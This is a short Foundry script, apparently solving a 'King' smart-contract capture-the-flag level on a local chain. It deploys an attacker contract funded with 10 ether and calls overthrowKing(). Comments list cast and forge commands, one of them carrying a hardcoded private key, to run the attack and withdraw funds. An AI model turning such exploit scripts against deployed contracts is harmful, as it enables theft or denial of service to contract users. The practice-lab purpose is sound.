// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";
import {KingAttacker} from "../src/KingAttacker.sol";

contract KingAttackerExecuter is Script {
    function run() external {
        vm.startBroadcast(HelperConfigLib.ATTACKER_KEY);
        KingAttacker attacker = new KingAttacker{value: 10 ether}(
            payable(0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321)
        );
        attacker.overthrowKing();
        vm.stopBroadcast();
    }
}

/*
- to get initial prize
cast call 0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321 "prize()(uint256)" --rpc-url http://localhost:8545
- attack
forge script script/KingAttackerExecuter.s.sol:KingAttackerExecuter --rpc-url http://localhost:8545 -vvv --broadcast
- see if prize got updated
cast call 0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321 "prize()(uint256)" --rpc-url http://localhost:8545
- submit the instance
- withdraw remaining amount
cast send 0x99dBE4AEa58E518C50a1c04aE9b48C9F6354612f "withdraw()" --rpc-url http://localhost:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
*/
